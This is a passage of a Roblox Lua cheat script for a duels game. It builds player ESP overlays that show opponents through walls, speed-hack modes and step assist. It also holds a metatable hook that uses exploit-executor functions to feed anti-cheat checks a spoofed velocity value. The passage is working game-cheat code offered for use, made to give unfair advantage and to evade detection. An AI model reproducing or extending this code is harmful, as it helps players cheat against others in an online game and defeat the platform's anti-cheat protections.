    Instance.new("UICorner", avatar).CornerRadius = UDim.new(1, 0)
    task.spawn(function()
        local ok, image = pcall(function()
            return Players:GetUserThumbnailAsync(player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size48x48)
        end)
        if ok and image and avatar.Parent then avatar.Image = image end
    end)

    local speed = Instance.new("TextLabel")
    speed.Name = "Speed"
    speed.Size = UDim2.new(1, 0, 0, 40)
    speed.Position = UDim2.new(0, 0, 0, 0)
    speed.BackgroundTransparency = 1
    speed.Text = "0.0"
    speed.TextColor3 = PLAYER_ESP_COLOR
    speed.Font = Enum.Font.GothamBlack
    speed.TextSize = 30
    speed.TextXAlignment = Enum.TextXAlignment.Center
    speed.TextYAlignment = Enum.TextYAlignment.Center
    speed.TextStrokeTransparency = 0
    speed.TextStrokeColor3 = Color3.fromRGB(20, 20, 24)
    speed.Parent = root

    local displayName = Instance.new("TextLabel")
    displayName.Name = "DisplayName"
    displayName.Size = UDim2.new(1, 0, 0, 17)
    displayName.Position = UDim2.new(0, 0, 0, 40)
    displayName.BackgroundTransparency = 1
    displayName.Text = player.DisplayName
    displayName.TextColor3 = PLAYER_ESP_COLOR
    displayName.Font = Enum.Font.GothamBold
    displayName.TextSize = 10
    displayName.TextXAlignment = Enum.TextXAlignment.Center
    displayName.TextStrokeTransparency = 0
    displayName.TextStrokeColor3 = Color3.fromRGB(20, 20, 24)
    displayName.Parent = root
    return root, speed, displayName
end

local function setPlayerESPCharacter(playerData, character)
    removeESPHighlight(playerData)
    if not S.espEnabled or not character or not character.Parent then return end
    local highlight = Instance.new("Highlight")
    highlight.Name = "VX7_ESPPlayer"
    highlight.Adornee = character
    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    highlight.FillTransparency = PLAYER_ESP_FILL_TRANSPARENCY
    highlight.OutlineTransparency = PLAYER_ESP_OUTLINE_TRANSPARENCY
    highlight.FillColor = PLAYER_ESP_COLOR
    highlight.OutlineColor = PLAYER_ESP_COLOR
    pcall(function() highlight:SetAttribute("VX7ESP", true) end)
    highlight.Parent = character
    playerData.highlight = highlight
end

local function watchESPPlayer(player)
    if not player or player == LP then return end
    removeESPForPlayer(player)
    local cache = S.espPlayerCache
    local data = {lastSpeedText = nil}
    cache.players[player] = data
    local screenGui = ensurePlayerESPGui()
    data.box = createESPBox(screenGui)
    data.infoFrame, data.speedLabel, data.nameLabel = createESPInfoCard(screenGui, player)
    setPlayerESPCharacter(data, player.Character)

    data.charConn = player.CharacterAdded:Connect(function(character)
        task.delay(0.1, function()
            if S.espEnabled and cache.players[player] == data then
                setPlayerESPCharacter(data, character)
            end
        end)
    end)
    data.charRemovingConn = player.CharacterRemoving:Connect(function(character)
        if data.highlight and data.highlight.Adornee == character then removeESPHighlight(data) end
        if data.box then data.box.Visible = false end
        if data.infoFrame then data.infoFrame.Visible = false end
    end)
end

local function updateESP(deltaTime)
    if not S.espEnabled then return end
    local cache = S.espPlayerCache
    local currentCamera = workspace.CurrentCamera
    if not currentCamera then return end
    cache.infoAccumulator = (cache.infoAccumulator or 0) + (deltaTime or 1 / 60)
    local updateInfo = cache.infoAccumulator >= 1 / 30
    if updateInfo then cache.infoAccumulator = 0 end

    for player, data in pairs(cache.players) do
        local character = player.Character
        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
        local root = character and character:FindFirstChild("HumanoidRootPart")
        local head = character and character:FindFirstChild("Head")
        if character and humanoid and humanoid.Health > 0 and root then
            local headPos = (head and head.Position or root.Position + Vector3.new(0, 1, 0)) + Vector3.new(0, 1.6, 0)
            local footPos = root.Position - Vector3.new(0, 3, 0)
            local topScreen, topOnScreen = currentCamera:WorldToViewportPoint(headPos)
            local bottomScreen, bottomOnScreen = currentCamera:WorldToViewportPoint(footPos)
            if data.box and topOnScreen and bottomOnScreen and topScreen.Z > 0 and bottomScreen.Z > 0 then
                local height = math.abs(bottomScreen.Y - topScreen.Y)
                local width = height * 0.55
                if height == height and width == width and height > 0 then
                    data.box.Size = UDim2.fromOffset(width, height)
                    data.box.Position = UDim2.fromOffset((topScreen.X + bottomScreen.X) * 0.5 - width * 0.5, math.min(topScreen.Y, bottomScreen.Y))
                    data.box.Visible = true
                else
                    data.box.Visible = false
                end
            elseif data.box then
                data.box.Visible = false
            end

            if updateInfo and data.infoFrame and data.speedLabel then
                local cardPos, onScreen = currentCamera:WorldToViewportPoint(root.Position + Vector3.new(0, 3.45, 0))
                if onScreen and cardPos.Z > 0 then
                    data.infoFrame.Position = UDim2.fromOffset(cardPos.X, cardPos.Y)
                    data.infoFrame.Visible = true
                    local velocity = root.AssemblyLinearVelocity
                    local speedText = tostring(math.floor(Vector3.new(velocity.X, 0, velocity.Z).Magnitude * 10 + 0.5) / 10)
                    if data.lastSpeedText ~= speedText then
                        data.lastSpeedText = speedText
                        data.speedLabel.Text = speedText
                    end
                    data.speedLabel.TextColor3 = PLAYER_ESP_COLOR
                else
                    data.infoFrame.Visible = false
                end
            end
            local highlight = data.highlight
            if (not highlight or not highlight.Parent or highlight.Adornee ~= character) and S.espEnabled then
                setPlayerESPCharacter(data, character)
            elseif highlight then
                if highlight.FillColor ~= PLAYER_ESP_COLOR then highlight.FillColor = PLAYER_ESP_COLOR end
                if highlight.OutlineColor ~= PLAYER_ESP_COLOR then highlight.OutlineColor = PLAYER_ESP_COLOR end
            end
        else
            if data.box then data.box.Visible = false end
            if data.infoFrame then data.infoFrame.Visible = false end
            if data.highlight then removeESPHighlight(data) end
        end
    end
end

local function stopESPLoop()
    S.espEnabled = false
    local cache = S.espPlayerCache
    if not cache then return end
    for _, name in ipairs({"addConn", "remConn", "renderConn"}) do
        local connection = cache[name]
        if connection then pcall(function() connection:Disconnect() end); cache[name] = nil end
    end
    if cache.renderBound then
        pcall(function() RunService:UnbindFromRenderStep(PLAYER_ESP_BIND_NAME) end)
        cache.renderBound = false
    end
    clearESP()
    if cache.screenGui then
        pcall(function() cache.screenGui:Destroy() end)
        cache.screenGui = nil
    end
    cache.infoAccumulator = 0
end

local function startESPLoop()
    stopESPLoop()
    S.espEnabled = true
    local cache = S.espPlayerCache
    ensurePlayerESPGui()
    for _, player in ipairs(Players:GetPlayers()) do watchESPPlayer(player) end
    cache.addConn = Players.PlayerAdded:Connect(watchESPPlayer)
    cache.remConn = Players.PlayerRemoving:Connect(removeESPForPlayer)
    local bindOk = pcall(function()
        RunService:BindToRenderStep(PLAYER_ESP_BIND_NAME, Enum.RenderPriority.Camera.Value + 2, updateESP)
    end)
    if bindOk then
        cache.renderBound = true
    else
        cache.renderConn = RunService.RenderStepped:Connect(updateESP)
    end
end

local function toggleESP(on)
    if on then startESPLoop() else stopESPLoop() end
end

SWING_COOLDOWN = 0.25
AUTO_BAT_SPEED, AUTO_BAT_VERT_SPEED, AUTO_BAT_DIST, AUTO_BAT_HEIGHT, AUTO_BAT_V_OFF, AUTO_BAT_TURN_SPEED, AUTO_BAT_MAX_TURN_RATE =
    58, 52, 0.15, 0.35, 0.65, 285, 28

S.ui = function(pcVal, mobVal) return S.IS_MOBILE and mobVal or pcVal end
local function applyPhoneGuiScale(frame, scaleValue, storeKey)
    if not frame then return end
    local scaleObj = frame:FindFirstChild("VisionPhoneScale")
    if not scaleObj then
        scaleObj = Instance.new("UIScale")
        scaleObj.Name = "VisionPhoneScale"
        scaleObj.Parent = frame
    end
    scaleObj.Scale = S.IS_TOUCH_DEVICE and scaleValue or 1
    if storeKey then
        S[storeKey] = scaleObj
    end
end
S.getActiveSpeed = function()
    if S.laggerMode == 1 then return S.LS
    elseif S.laggerMode == 2 then return S.LCS
    elseif S.speedMode then return S.CS
    else return S.NS
    end
end
S.getSpeedModeName = function()
    if S.laggerMode == 1 then return "Lagger Normal Speed" end
    if S.laggerMode == 2 then return "Lagger Carry Speed" end
    return S.speedMode and "Carry" or "Normal"
end
S.getAutoPathSpeed = function()
    if S.laggerMode == 1 then return S.LS
    elseif S.laggerMode == 2 then return S.LCS
    else return S.NS end
end

local function isSpeedRagdollState(hum)
    if not hum then return true end
    local st = hum:GetState()
    return hum.PlatformStand
        or st == Enum.HumanoidStateType.Physics
        or st == Enum.HumanoidStateType.Ragdoll
        or st == Enum.HumanoidStateType.FallingDown
end

-- VX7's original speed core: obstacle resolution, step assist, spoof hooks and LV sync.
S._vxSpeedMotion =
	{ smoothed = Vector2.zero, lastMagnitude = 0, stepToken = 0, stepTarget = nil, stepExpires = 0, root = nil }
S._unifiedMovementEnabled = S._unifiedMovementEnabled ~= false
S._vxSpeedCollisionParams = RaycastParams.new()
S._vxSpeedCollisionParams.FilterType = Enum.RaycastFilterType.Exclude
S._vxSpeedCollisionParams.IgnoreWater = true
pcall(function()
	S._vxSpeedCollisionParams.RespectCanCollide = true
end)
function S._vxSpeedPulseVertical(parent, arg, lineVelocity, arg2)
	if not parent or not parent.Parent then
		return
	end
	local name, name2 = arg .. "Attachment", arg .. "LinearVelocity"
	local attachment = parent:FindFirstChild(name)
	if not attachment then
		attachment = Instance.new("Attachment")
		attachment.Name = name
		attachment.Parent = parent
	end
	local linearVelocity = parent:FindFirstChild(name2)
	if not linearVelocity then
		linearVelocity = Instance.new("LinearVelocity")
		linearVelocity.Name = name2
		linearVelocity.Attachment0 = attachment
		linearVelocity.RelativeTo = Enum.ActuatorRelativeTo.World
		linearVelocity.VelocityConstraintMode = Enum.VelocityConstraintMode.Line
		linearVelocity.LineDirection = Vector3.new(0, 1, 0)
		linearVelocity.ForceLimitsEnabled = false
		linearVelocity.Parent = parent
	end
	linearVelocity:SetAttribute("VX7Pulse", {} and (os.clock()) or 0)
	local attribute = linearVelocity:GetAttribute("VX7Pulse")
	linearVelocity.LineVelocity = lineVelocity or 0
	linearVelocity.Enabled = true
	task.delay(arg2 or 0.12, function()
		if not linearVelocity.Parent or linearVelocity:GetAttribute("VX7Pulse") ~= attribute then
			return
		end
		pcall(function()
			linearVelocity:Destroy()
		end)
		if attachment.Parent then
			pcall(function()
				attachment:Destroy()
			end)
		end
	end)
end
function S._vxSpeedCheckRoof(arg, arg2)
	if not arg or not arg.Parent or S._youtResetInProgress or S.dropBrainrotActive then
		return false
	end
	if S.batTpEnabled or S._smartBatTpDriving then
		return false
	end
	local n23 = math.max(arg.AssemblyLinearVelocity.Y, 0)
	if n23 <= 0.25 then
		return false
	end
	local vxSpeedCollisionParams = S._vxSpeedCollisionParams
	vxSpeedCollisionParams.FilterDescendantsInstances = { arg.Parent }
	local n24 = math.clamp(arg2 or 0.016666666666666666, 0.004166666666666667, 0.06666666666666667)
	if
		not workspace:Raycast(
			arg.Position,
			Vector3.new(0, 3.05 + math.min(n23 * n24, 0.9), 0),
			vxSpeedCollisionParams
		)
	then
		return false
	end
	S._vxSpeedClearStep(arg)
	S._vxSpeedPulseVertical(arg, "VX7VampireRoofGuard", 0, 0.14)
	return true
end
function S._vxSpeedClearStep(arg)
	local vxSpeedMotion = S._vxSpeedMotion
	vxSpeedMotion.stepToken = vxSpeedMotion.stepToken + 1
	vxSpeedMotion.stepTarget = nil
	vxSpeedMotion.stepExpires = 0
	if not arg then
		return
	end
	local vX7SpeedStepLinearVelocity = arg:FindFirstChild("VX7SpeedStepLinearVelocity")
	if vX7SpeedStepLinearVelocity then
		pcall(function()
			vX7SpeedStepLinearVelocity:Destroy()
		end)
	end
	local vX7SpeedStepAttachment = arg:FindFirstChild("VX7SpeedStepAttachment")
	if vX7SpeedStepAttachment then
		pcall(function()
			vX7SpeedStepAttachment:Destroy()
		end)
	end
end
function S._vxSpeedRequestStep(root, stepTarget)
	if not root or not root.Parent or not stepTarget or stepTarget <= root.Position.Y + 0.05 then
		return
	end
	local vxSpeedMotion, now3 = S._vxSpeedMotion, os.clock()
	if vxSpeedMotion.stepTarget and vxSpeedMotion.root == root and now3 < vxSpeedMotion.stepExpires then
		vxSpeedMotion.stepTarget = math.max(vxSpeedMotion.stepTarget, stepTarget)
		vxSpeedMotion.stepExpires = math.max(vxSpeedMotion.stepExpires, now3 + 0.32)
		return
	end
	S._vxSpeedClearStep(root)
	vxSpeedMotion.root = root
	vxSpeedMotion.stepTarget = stepTarget
	vxSpeedMotion.stepExpires = now3 + 0.32
	local stepToken = vxSpeedMotion.stepToken
	task.spawn(function()
		while
			vxSpeedMotion.stepToken == stepToken
			and root.Parent
			and root.Parent == LP.Character
			and os.clock() < vxSpeedMotion.stepExpires
		do
			local n23 = (vxSpeedMotion.stepTarget or root.Position.Y) - root.Position.Y
			if n23 <= 0.05 then
				break
			end
			S._vxSpeedCollisionParams.FilterDescendantsInstances = { root.Parent }
			if
				workspace:Raycast(
					root.Position,
					Vector3.new(0, 3.05 + math.min(n23, 2.35), 0),
					S._vxSpeedCollisionParams
				)
			then
				break
			end
			local vX7SpeedStepAttachment = root:FindFirstChild("VX7SpeedStepAttachment")
			if not vX7SpeedStepAttachment then
				vX7SpeedStepAttachment = Instance.new("Attachment")
				vX7SpeedStepAttachment.Name = "VX7SpeedStepAttachment"
				vX7SpeedStepAttachment.Parent = root
			end
			local vX7SpeedStepLinearVelocity = root:FindFirstChild("VX7SpeedStepLinearVelocity")
			if not vX7SpeedStepLinearVelocity then
				vX7SpeedStepLinearVelocity = Instance.new("LinearVelocity")
				vX7SpeedStepLinearVelocity.Name = "VX7SpeedStepLinearVelocity"
				vX7SpeedStepLinearVelocity.Attachment0 = vX7SpeedStepAttachment
				vX7SpeedStepLinearVelocity.RelativeTo = Enum.ActuatorRelativeTo.World
				vX7SpeedStepLinearVelocity.VelocityConstraintMode = Enum.VelocityConstraintMode.Line
				vX7SpeedStepLinearVelocity.LineDirection = Vector3.new(0, 1, 0)
				vX7SpeedStepLinearVelocity.ForceLimitsEnabled = false
				vX7SpeedStepLinearVelocity.Parent = root
			end
			vX7SpeedStepLinearVelocity.LineVelocity = math.clamp(n23 * 11, 7, 17)
			vX7SpeedStepLinearVelocity.Enabled = true
			RunService.Heartbeat:Wait()
		end
		if vxSpeedMotion.stepToken == stepToken then
			S._vxSpeedClearStep(root)
		end
	end)
end
function S._vxSpeedWalkableStep(arg, arg2, arg3, arg4, arg5)
	if not arg2 or not arg or not arg.Parent or not arg3 or arg3.Magnitude < 0.01 then
		return false
	end
	local vxSpeedCollisionParams = S._vxSpeedCollisionParams
	vxSpeedCollisionParams.FilterDescendantsInstances = { arg.Parent }
	local hit = workspace:Raycast(arg.Position, Vector3.new(0, -7, 0), vxSpeedCollisionParams)
	if not hit or hit.Normal.Y < 0.45 then
		return false
	end
	local n23, n24 =
		math.clamp((arg2.HipHeight or 2) + 0.25, 1.35, 2.35),
		arg.Position + arg3.Unit * (arg5 + math.min(arg4, 0.65) + 0.08)
	arg3 = workspace:Raycast(
		Vector3.new(n24.X, hit.Position.Y + n23 + 0.25, n24.Z),
		Vector3.new(0, -n23 - 0.45, 0),
		vxSpeedCollisionParams
	)
	if not arg3 or arg3.Normal.Y < 0.55 then
		return false
	end
	n24 = arg3.Position.Y - hit.Position.Y
	if n24 > 0.05 and n24 <= n23 then
		return true, arg3.Position.Y + (arg2.HipHeight or 2) + arg.Size.Y * 0.5 + 0.06
	end
	return false
end
function S._vxSpeedResolveHorizontal(arg, arg2, arg3, arg4)
	local vector = Vector3.new(arg3.X, 0, arg3.Z)
	if vector.Magnitude < 0.01 then
		return vector, false, false
	end
	local vxSpeedCollisionParams = S._vxSpeedCollisionParams
	vxSpeedCollisionParams.FilterDescendantsInstances = { arg.Parent }
	local magnitude, n23, n24 =
		vector.Magnitude,
		math.clamp(
			math.max(arg4 or 0.016666666666666666, 0.011111111111111112),
			0.011111111111111112,
			0.06666666666666667
		),
		math.clamp(math.max(arg.Size.X, arg.Size.Z) * 0.5, 0.9, 1)
	arg3, arg4 = S._vxSpeedWalkableStep(arg, arg2, vector, vector.Magnitude * n23, n24)
	if arg3 then
		S._vxSpeedRequestStep(arg, arg4)
	end
	arg3, arg4 = false
	local flag15 = false
	for i = 1, 2, 1 do
		if vector.Magnitude < 0.02 then
			break
		end
		local n25, hit = vector.Magnitude * n23
		if
			not pcall(function()
				hit =
					workspace:Spherecast(arg.Position, n24, vector.Unit * (n25 + 0.03), vxSpeedCollisionParams)
			end)
		then
			hit = workspace:Raycast(arg.Position, vector.Unit * (n25 + n24 + 0.03), vxSpeedCollisionParams)
		end
		if not hit then
			break
		end
		i = math.cos(math.rad(math.clamp(arg2 and arg2.MaxSlopeAngle or 45, 0, 89)))
		if hit.Normal.Y >= i then
			break
		end
		local v45, vector2 = S._vxSpeedWalkableStep(arg, arg2, vector, n25, n24)
		if v45 then
			S._vxSpeedRequestStep(arg, vector2)
			break
		end
		vector2 = Vector3.new(hit.Normal.X, 0, hit.Normal.Z)
		if vector2.Magnitude < 0.05 then
			break
		end
		vector2 = vector2.Unit
		i = vector:Dot(vector2)
		if i >= 0 then
			break
		end
		arg3 = true
		v45 = vector
		if arg4 and arg4:Dot(vector2) < 0.55 then
			vector, flag15 = Vector3.zero, true
			break
		end
		arg4 = arg4 or vector2
		local n26, n27 = v45 - vector2 * i, math.max((hit.Distance or 0) - 0.03, 0)
		vector = n26 - vector2 * math.min(-i, n27 / n23)
	end
	if vector.Magnitude < 0.04 then
		vector = Vector3.zero
	end
	if vector.Magnitude > magnitude then
		vector = vector.Unit * magnitude
	end
	return vector, arg3, flag15
end

		_G.fakeVelocity = Vector3.zero
		_G.spoofedVelocity = _G.fakeVelocity
		fakeVelocity = _G.fakeVelocity
		spoofedVelocity = _G.fakeVelocity
		S._vx7SpoofedVelocity = _G.fakeVelocity
		local humanoidRootPart2, humanoid2
		local function fn86(character2)
			if not character2 then
				humanoidRootPart2, humanoid2 = nil, nil
				S._vxCachedRoot = nil
				S._vxCachedHum = nil
				return
			end
			local ok, result = pcall(character2.WaitForChild, character2, "HumanoidRootPart", 5)
			humanoidRootPart2 = ok and result or (character2:FindFirstChild("HumanoidRootPart"))
			ok, result = pcall(character2.WaitForChild, character2, "Humanoid", 5)
			humanoid2 = ok and result or (character2:FindFirstChildOfClass("Humanoid"))
			S._vxCachedRoot = humanoidRootPart2
			S._vxCachedHum = humanoid2
		end
		if LP.Character then
			task.spawn(fn86, LP.Character)
		end
		LP.CharacterAdded:Connect(fn86)
		LP.CharacterRemoving:Connect(function()
			humanoidRootPart2, humanoid2 = nil, nil
			S._vxCachedRoot = nil
			S._vxCachedHum = nil
		end)
		S._vx7Hooked = false
		function S._vx7SetupHooks()
			if S._vx7Hooked then
				return
			end
			local v45 = getrawmetatable and (getrawmetatable(game))
			if not v45 or type(v45) ~= "table" or not newcclosure then
				return
			end
			local v46, v47 = setreadonly or make_writeable, isreadonly or iswriteable
			S._vx7Hooked = pcall(function()
				if v47 and (v47(v45)) and v46 then
					v46(v45, false)
				elseif v46 then
					v46(v45, false)
				end
				local index, newindex = v45.__index, v45.__newindex
				v45.__index = newcclosure(function(arg, arg2)
					if
						(arg2 == "AssemblyLinearVelocity" or arg2 == "Velocity")
						and not checkcaller()
						and (rawequal(arg, humanoidRootPart2))
					then
						return _G.fakeVelocity
					end
					return index(arg, arg2)
				end)
				v45.__newindex = newcclosure(function(arg, arg2, fakeVelocity_)
					if
						(arg2 == "AssemblyLinearVelocity" or arg2 == "Velocity")
						and not checkcaller()
						and (rawequal(arg, humanoidRootPart2))
					then
						_G.fakeVelocity = fakeVelocity_
						fakeVelocity = fakeVelocity_
						_G.spoofedVelocity = fakeVelocity_
						spoofedVelocity = fakeVelocity_
						S._vx7SpoofedVelocity = fakeVelocity_
						return
					end
					return newindex(arg, arg2, fakeVelocity_)
				end)
				if v46 then
					v46(v45, true)
				end
			end)
		end
		function S._vxSyncSpoof(fakeVelocity_)
			_G.fakeVelocity = fakeVelocity_
			fakeVelocity = fakeVelocity_
			_G.spoofedVelocity = fakeVelocity_
			spoofedVelocity = fakeVelocity_
			S._vx7SpoofedVelocity = fakeVelocity_
		end
		task.spawn(function()
			pcall(S._vx7SetupHooks)
			task.wait(1)
			pcall(S._vx7SetupHooks)
		end)
		local function ensureLV(root)
			pcall(S._vx7SetupHooks)
			S._vxSpeedMotion.root = root
			if S._vxSyncSpoof then
				S._vxSyncSpoof(
					Vector3.new(
						root.AssemblyLinearVelocity.X,
						root.AssemblyLinearVelocity.Y,
						root.AssemblyLinearVelocity.Z
					)
				)
			end
		end
		local function setLV(arg, arg2, arg3, arg4)
			if not arg or not arg.Parent then
				return
			end
			ensureLV(arg)
			local y, vector = arg.AssemblyLinearVelocity.Y, Vector3.new(arg2 or 0, 0, arg3 or 0)
			arg4 = if S._unifiedLastJumpTime and os.clock() - S._unifiedLastJumpTime < 0.15
				then 0
				else if math.abs(y) > 20 then (math.clamp(y, -20, 20)) else y
			if vector.Magnitude > 0.05 then
				arg3, arg2 = math.min(vector.Magnitude, 16), vector.Unit
				if S._vxSyncSpoof then
					S._vxSyncSpoof(Vector3.new(arg2.X * arg3, arg4, arg2.Z * arg3))
				end
				arg.AssemblyLinearVelocity = Vector3.new(vector.X, y, vector.Z)
			elseif S._vxSyncSpoof then
				S._vxSyncSpoof(Vector3.new(0, arg4, 0))
			end
		end
		local function clearLV()
			local root = S._vxSpeedMotion.root
			if S._vxSpeedClearStep then
				S._vxSpeedClearStep(root)
			end
			if S._vxSyncSpoof then
				S._vxSyncSpoof(Vector3.zero)
			end
			S._vxSpeedMotion.smoothed = Vector2.zero
			S._vxSpeedMotion.lastMagnitude = 0
			S._vxSpeedMotion.root = nil
		end
LP.CharacterRemoving:Connect(clearLV)
S._vxClearSpeedVelocity = clearLV
S._vxSetSpeedVelocity = setLV

S._unifiedResolveSpeed = function()
    local ok, speed = pcall(S.getActiveSpeed)
    if ok and type(speed) == "number" then return speed end
    return tonumber(S.NS) or 16
end

saveConfig = nil
updateFloatingButtons = nil

-- Función central para actualizar el botón flotante de Lagger
local function updateLaggerButtonVisual()
    local fb = S._floatingButtons
    if not fb.lagger then return end
    local active = S.laggerMode ~= 0 and not S.speedMode
    fb.l2Lagger.Text = ""
    S._setPButtonActive(fb.lagger, fb.strokeLagger, fb.l1Lagger, fb.l2Lagger, active)
end

S.refreshSpeedModeLabel = function()
    if S.speedClk then S.speedClk(S.speedMode and S.laggerMode == 0) end
    if S.setLaggerVisual then S.setLaggerVisual(S.laggerMode ~= 0) end
    updateLaggerButtonVisual()
    if updateFloatingButtons then updateFloatingButtons() end
end

S.applySpeedVelocityNow = function(deltaTime)
    if S._youtResetInProgress then return end
    local char = LP.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not char or not hum or not root or hum.Health <= 0 then return end
    if S._vxSpeedCheckRoof and S._vxSpeedCheckRoof(root, deltaTime or 1 / 60) then
        setLV(root, 0, 0, deltaTime)
        return
    end
    local direction = hum.MoveDirection
    if direction.Magnitude > 0.05 then
        direction = Vector3.new(direction.X, 0, direction.Z)
        local magnitude = direction.Magnitude
        if magnitude > 0.001 then
            direction = direction.Unit
            S.lastMoveDir = direction
            pcall(function() if root.SetNetworkOwner then root:SetNetworkOwner(LP) end end)
            local horizontal = Vector3.new(direction.X * S._unifiedResolveSpeed(), 0, direction.Z * S._unifiedResolveSpeed())
            if S._vxSpeedResolveHorizontal then
                local ok, result = pcall(S._vxSpeedResolveHorizontal, root, hum, horizontal, deltaTime or 1 / 60)
                if ok and typeof(result) == "Vector3" then horizontal = result end
            end
            setLV(root, horizontal.X, horizontal.Z, deltaTime)
        else
            setLV(root, 0, 0, deltaTime)
        end
    else
        setLV(root, 0, 0, deltaTime)
    end
end

S.setNormalSpeedMode = function()
    S.laggerMode = 0
    S.speedMode = false
    S.refreshSpeedModeLabel()
    S.applySpeedVelocityNow()
end

S.setCarrySpeedMode = function()
    S.laggerMode = 0
    S.speedMode = true
    S.refreshSpeedModeLabel()
    S.applySpeedVelocityNow()
end

S.setLaggerNormalMode = function()
    S.speedMode = false
    S.laggerMode = 1
    S.refreshSpeedModeLabel()
    S.applySpeedVelocityNow()
end
S.setLaggerCarryMode = function()
    S.speedMode = false
    S.laggerMode = 2
    S.refreshSpeedModeLabel()
    S.applySpeedVelocityNow()
end

S.setLaggerOffMode = function()
    S.laggerMode = 0
    S.refreshSpeedModeLabel()
end

S.toggleCarryMode = function()
    if S.laggerMode ~= 0 then
        S.laggerMode = 0
        S.speedMode = true
    else
        S.speedMode = not S.speedMode
    end
    S.refreshSpeedModeLabel()
    S.applySpeedVelocityNow()
end

S.toggleLaggerMode = function()
    if S.laggerMode == 1 then
        S.setLaggerOffMode()
        if S.setLaggerVisual then S.setLaggerVisual(false) end
    else
        S.setLaggerNormalMode()
        if S.setLaggerVisual then S.setLaggerVisual(true) end
    end
end

S.setupSpeedBillboard = function(char)
    local head = char and (char:FindFirstChild("Head") or char:WaitForChild("Head", 5))
    if not head then return end
    local oldBB = head:FindFirstChild("VisionSpeedBB")
    if oldBB then oldBB:Destroy() end

    -- Colores tomados del indicador sobre la cabeza de Ace Duels (tema 2):
    -- pale 210,218,228 -> accent 104,116,132 -> accent2 156,169,186.
    local bb = Instance.new("BillboardGui", head)
    bb.Name = "VisionSpeedBB"
    bb.Size = UDim2.fromOffset(118, 36)
    bb.StudsOffset = Vector3.new(0, 1.75, 0)
    bb.AlwaysOnTop = true
    bb.ResetOnSpawn = false
    bb.LightInfluence = 0
    bb.MaxDistance = 150

    local function addAceGradient(label)
        local gradient = Instance.new("UIGradient", label)
        gradient.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 230, 255)),
            ColorSequenceKeypoint.new(0.5, Color3.fromRGB(218, 155, 255)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(154, 62, 230)),
        })
        return gradient
    end

    -- Solo mostrar la velocidad; se eliminó por completo el texto de Discord.
    local speedLbl = Instance.new("TextLabel", bb)
    speedLbl.Name = "SpeedBillLbl"
    speedLbl.Size = UDim2.new(1, 0, 1, 0)
    speedLbl.Position = UDim2.new(0, 0, 0, 0)
    speedLbl.BackgroundTransparency = 1
    speedLbl.Text = "Speed: 0"
    speedLbl.Font = Enum.Font.GothamBlack
    speedLbl.TextScaled = true
    speedLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    speedLbl.TextStrokeTransparency = 0
    speedLbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    local speedSize = Instance.new("UITextSizeConstraint", speedLbl)
    speedSize.MinTextSize = 4
    speedSize.MaxTextSize = 12
    addAceGradient(speedLbl)

    S.speedDiscordLabel = nil
    S.speedCounterLabel = speedLbl
end

local function updateSpeedBillboard(hrp)
    if not S.speedCounterLabel then return end
    local now = os.clock()
    if now - S.speedLabelLastUpdate >= 0.12 then
        S.speedLabelLastUpdate = now
        local v = hrp.Velocity
        local flatSpeed = math.sqrt((v.X * v.X) + (v.Z * v.Z))
        S.speedCounterLabel.Text = string.format("Speed: %.1f", flatSpeed)
    end
end


-- Ragdoll Timer tomado únicamente de Ace Duels.
-- Es independiente del indicador de velocidad de HAVEN DUELS.
visionRagdollTimer = {
    billboard = nil,
    label = nil,
    character = nil,
    active = false,
    startTime = 0,
    endTime = 0,
    goUntil = 0,
    wasRagdolled = false,
    duration = 2.6,
    connection = nil,
}

local function setupVisionRagdollTimer(char)
    local head = char and (char:FindFirstChild("Head") or char:WaitForChild("Head", 5))
    if not head then return end
    local old = head:FindFirstChild("VisionRagdollTimerBB")
    if old then old:Destroy() end
    if visionRagdollTimer.connection then
        pcall(function() visionRagdollTimer.connection:Disconnect() end)
        visionRagdollTimer.connection = nil
    end
    local bb = Instance.new("BillboardGui", head)
    bb.Name = "VisionRagdollTimerBB"
    bb.Size = UDim2.fromOffset(112, 28)
    bb.StudsOffset = Vector3.new(0, 4.45, 0)
    bb.AlwaysOnTop = true
    bb.ResetOnSpawn = false
    bb.LightInfluence = 0
    bb.MaxDistance = 150
    local label = Instance.new("TextLabel", bb)
    label.Name = "RagdollTimerLabel"
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.Text = ""
    label.Font = Enum.Font.GothamBlack
    label.TextScaled = true
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.TextStrokeTransparency = 0
    label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    local sizeConstraint = Instance.new("UITextSizeConstraint", label)
    sizeConstraint.MinTextSize = 4
    sizeConstraint.MaxTextSize = 17
    local gradient = Instance.new("UIGradient", label)
    gradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 230, 255)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(218, 155, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(154, 62, 230)),
    })
    visionRagdollTimer.billboard = bb
    visionRagdollTimer.label = label
    visionRagdollTimer.character = char
    visionRagdollTimer.active = false
    visionRagdollTimer.startTime = 0
    visionRagdollTimer.endTime = 0
    visionRagdollTimer.goUntil = 0
    visionRagdollTimer.wasRagdolled = false

    local function isRagdolled(humanoid)
        if not humanoid then return false end
        local state = humanoid:GetState()
        return humanoid.PlatformStand
            or state == Enum.HumanoidStateType.Physics
            or state == Enum.HumanoidStateType.Ragdoll
            or state == Enum.HumanoidStateType.FallingDown
    end

    visionRagdollTimer.connection = RunService.Heartbeat:Connect(function()
        if visionRagdollTimer.character ~= char or not bb.Parent or not label.Parent then return end
        local humanoid = char:FindFirstChildOfClass("Humanoid")
        if not humanoid or humanoid.Health <= 0 then
            label.Text = ""
            visionRagdollTimer.active = false
            return
        end
        local now = os.clock()
        local ragdolled = isRagdolled(humanoid)
        if ragdolled and not visionRagdollTimer.wasRagdolled and not visionRagdollTimer.active and visionRagdollTimer.goUntil <= now then
            visionRagdollTimer.active = true
            visionRagdollTimer.startTime = now
